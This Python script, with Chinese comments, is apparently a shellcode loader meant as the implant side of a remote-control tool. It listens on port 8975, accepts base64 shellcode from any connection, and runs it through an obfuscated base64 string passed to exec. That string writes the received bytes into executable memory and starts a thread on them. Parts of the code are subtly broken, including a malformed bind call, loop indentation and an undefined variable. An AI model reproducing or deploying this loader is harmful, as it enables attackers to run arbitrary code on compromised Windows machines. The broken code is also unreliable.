import socket,base64,ctypes

# 执行上线端,端口自定义
# 绑定监听端口
# 接受发送过来的sc
# sc进行命令执行

def zhixing(cd):
    zx='c2M9YmFzZTY0LmI2NGRlY29kZShjZCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQKc2hhbmd4aWFuID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNjKSwgMHgxMDAwLCAweDQwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdWludDY0KHNoYW5neGlhbiksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzYyksIGxlbihzYykpCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKDAsIDAsIGN0eXBlcy5jX3VpbnQ2NChzaGFuZ3hpYW4pLCAwLCAwLCAwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSkKano9YmFzZTY0LmI2NGVuY29kZShqeik='
    zx=base64.b64decode(zx)
    exec(zx)

if __name__ == '__main__':
    s=socket.socket()
    s.bind('0.0.0.0',8975)
    s.listen(5)
while True:
    ss,addr=s.accept()
    while True:
        cd=ss.recv(102400).decode()
        zhixing(cd)
ss.close()
s.close()